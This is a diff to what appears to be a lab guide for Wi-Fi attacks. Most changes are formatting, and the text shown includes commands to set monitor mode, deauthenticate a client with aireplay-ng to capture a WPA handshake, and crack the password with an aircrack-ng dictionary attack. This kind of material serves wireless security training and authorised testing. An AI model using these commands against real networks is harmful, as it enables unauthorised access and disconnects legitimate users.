@@ -24,7 +24,7 @@
 1. Cracking WEP:
 ```
    a.	Connect the Alfa card to the kali linux vm. Check the interface name using the below command:
-        #iwconfig
+       #iwconfig
    b.	Set the wireless interface to Monitor mode with the following commands:
        # ifconfig wlan0 down
        # iwconfig wlan0 mode monitor
@@ -57,11 +57,11 @@
 
 
 2. Cracking WPA2 Personal.
-   a.	Follow the steps a-g, as shown in the WEP Cracking.
-   b.	Deauthenticate the connected user to capture the WPA 4 way handshake, in which WPA keystream is present.
+   -	Follow the steps a-g, as shown in the WEP Cracking.
+   -	Deauthenticate the connected user to capture the WPA 4 way handshake, in which WPA keystream is present.
       `aireplay-ng -0 1 –a <AP Mac> -c <Client Mac> wlan0`
-   c.	Note the airodump-ng output to check if the WPA Handshake is captured.
-   d.	Once the WPA handshake is captured, crack the password using aircrack-ng dictionary attack.
+   -	Note the airodump-ng output to check if the WPA Handshake is captured.
+   -	Once the WPA handshake is captured, crack the password using aircrack-ng dictionary attack.
       `aircrack-ng <captured file> -w <Dictionary file>`
 
 
